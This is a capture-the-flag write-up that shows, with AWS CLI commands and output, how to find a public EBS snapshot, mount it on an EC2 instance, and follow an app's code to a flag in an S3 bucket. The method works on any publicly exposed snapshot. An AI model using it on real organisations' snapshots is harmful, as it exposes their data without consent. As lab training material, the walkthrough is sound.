# Challenge 2

We are back with another challenge where our developer team made a snapshot called challenge-2 public. Seems like this was a bad mistake!

Can you get the flag to prove the severity of this mistake?

---

# Solution:
Whilst we know a snapshot is made public and it's name, we don't know the region so will need to iterate over all regions.

## Step 1: Find the snapshot
Query AWS for all the regions
```
aws ec2 describe-regions

#Save them to a file
regions.txt
eu-north-1
ap-south-1
eu-west-3
eu-west-2
eu-west-1
ap-northeast-3
ap-southeast-2
eu-central-1
us-east-1
us-east-2
us-west-1
us-west-2
```

Now listing all public snapshots that are restorable by all users.
Note: This is slow as it returns all the snapshots then you are cutting it down with grep.
```
for i in $(cat regions.txt); do echo $i; aws ec2 describe-snapshots --restorable-by-user-ids all --region $i | grep -C 10 -i 'challenge-2';done


eu-north-1
ap-south-1
eu-west-3
eu-west-2
eu-west-1
ap-northeast-3
ap-southeast-2
eu-central-1
us-east-1
us-east-2
            "Encrypted": false,
            "OwnerId": "895557238572",
            "Progress": "100%",
            "SnapshotId": "snap-0a07ebead239c8b60",
            "StartTime": "2022-02-15T16:53:24.484000+00:00",
            "State": "completed",
            "VolumeId": "vol-ffffffff",
            "VolumeSize": 200
        },
        {
            "Description": "challenge-2 @ SecurityLabs",
            "Encrypted": false,
            "OwnerId": "584358494719",
            "Progress": "100%",
            "SnapshotId": "snap-012f8a39fea09c32e",
            "StartTime": "2022-02-15T15:20:14.139000+00:00",
            "State": "completed",
            "VolumeId": "vol-0dc594dc7aeec81cf",
            "VolumeSize": 8
        },
        {
us-west-1
us-west-2

```

---


## Step 2: Read the snapshot
In order to view the snapshot, we need to meet a few conditions,
- An AWS account with privileges to create key-pairs, ec2 instances and volumes
- A volume in the same availability zone as the snapshot to attach it too
- An ec2 instance to attach the volume too
- A means to access that ec2 instance to explore the volume (ssh)
- A security group that allows SSH access

Create the key pair
```
aws ec2 create-key-pair --region us-east-2 --key-name ctf --query 'KeyMaterial' --output text > ~/.ssh/ctf.pem
```
Create an instance using that key pair
```
aws ec2 run-instances --region us-east-2 --image-id ami-0fb653ca2d3203ac1 --key-name ctf --security-group-ids sg-<redacted> --instance-type t2.micro --output table
```
The image id we are using ami-0fb653ca2d3203ac1 is a amazon ubuntu build.
The instance type should be eligible for the free tier
Key name should be that off the key pair we just made
The security group (sg) is just an existing one in my AWS account that allows ssh access.

From the output you need to grab the instance-id, public IP and availability zone
<..>
||  InstanceId            |  i-0ffc8c8e27e057a22                          ||
|||  AvailabilityZone                      |  us-east-2b                 |||
<..>

If the public IP doesn't appear in the initial output you can describe-instances to get it as it takes awhile sometimes
```
aws ec2 describe-instances --region us-east-2
<...>
3.<redacted>.4
<..>
```
Test the connection
ssh ubuntu@3.<redacted>4 -i ~/.ssh/ctf.pem

Create the volume
```
aws ec2 create-volume --snapshot-id snap-012f8a39fea09c32e --availability-zone us-east-2b --region us-east-2
{
    "AvailabilityZone": "us-east-2b",
    "CreateTime": "2022-02-16T04:51:51+00:00",
    "Encrypted": false,
    "Size": 8,
    "SnapshotId": "snap-012f8a39fea09c32e",
    "State": "creating",
    "VolumeId": "vol-0726ea352c04b36ab",
    "Iops": 100,
    "Tags": [],
    "VolumeType": "gp2",
    "MultiAttachEnabled": false
}
```

Attach the volume to the EC2 instance
```
aws ec2 attach-volume --volume-id vol-0726ea352c04b36ab --instance-id i-0ffc8c8e27e057a22 --device /dev/sdj --region us-east-2

{
    "AttachTime": "2022-02-16T04:53:02.294000+00:00",
    "Device": "/dev/sdf",
    "InstanceId": "i-0ffc8c8e27e057a22",
    "State": "attaching",
    "VolumeId": "vol-0726ea352c04b36ab"
}
```

Mount the volume inside the EC2 InstanceId
ssh ubuntu@3.<redacted>4 -i ~/.ssh/ctf.pem

Use lsblk to find the volume to mount
```
sudo lsblk
NAME    MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
loop0     7:0    0   25M  1 loop /snap/amazon-ssm-agent/4046
loop1     7:1    0 55.5M  1 loop /snap/core18/2253
loop2     7:2    0 61.9M  1 loop /snap/core20/1242
loop3     7:3    0 67.2M  1 loop /snap/lxd/21835
loop4     7:4    0 42.2M  1 loop /snap/snapd/14066
xvda    202:0    0    8G  0 disk
└─xvda1 202:1    0    8G  0 part /
xvdj    202:144  0    8G  0 disk
└─xvdj1 202:145  0    8G  0 part
```

I'm just looking for the one that isn't already mounted, so xvdj1
```
mkdir /mnt/ctf/
sudo mount /dev/xvdj1 /mnt/ctf/
cd /mnt/ctf/
```

## Find the flag
The flag itself is pretty hidden
However you find a python app
```
root@ip-172-31-19-153:/mnt/ctf/srv/app# cat app.py
import boto3
from flask import Flask,request

@app.route('/getFlag',methods=['GET'])
def query_flag():
    client = boto3.client('s3')
    client.download_file('0d0ec394ec2f5302ae2995217909f82d', '0d0ec394ec2f5302ae2995217909f82d.txt', 'flag.txt')

The boto s3 client uses the syntax bucketname, filename, output file name
```

We can directly query the bucket to download the flag
```
aws s3 cp s3://0d0ec394ec2f5302ae2995217909f82d/0d0ec394ec2f5302ae2995217909f82d.txt .

cat 0d0ec394ec2f5302ae2995217909f82d.txt
<..>
DM us the flag at @securitylabs_ on twitter to verify it!
```

---


Delete things so we don't get a big bill
```
aws ec2 terminate-instances --instance-ids i-0ffc8c8e27e057a22 --region us-east-2
{
    "TerminatingInstances": [
        {
            "CurrentState": {
                "Code": 32,
                "Name": "shutting-down"
            },
            "InstanceId": "i-0ffc8c8e27e057a22",
            "PreviousState": {
                "Code": 16,
                "Name": "running"
            }
        }
    ]
}

aws ec2 delete-volume --volume-id vol-0726ea352c04b36ab --region us-east-2
```
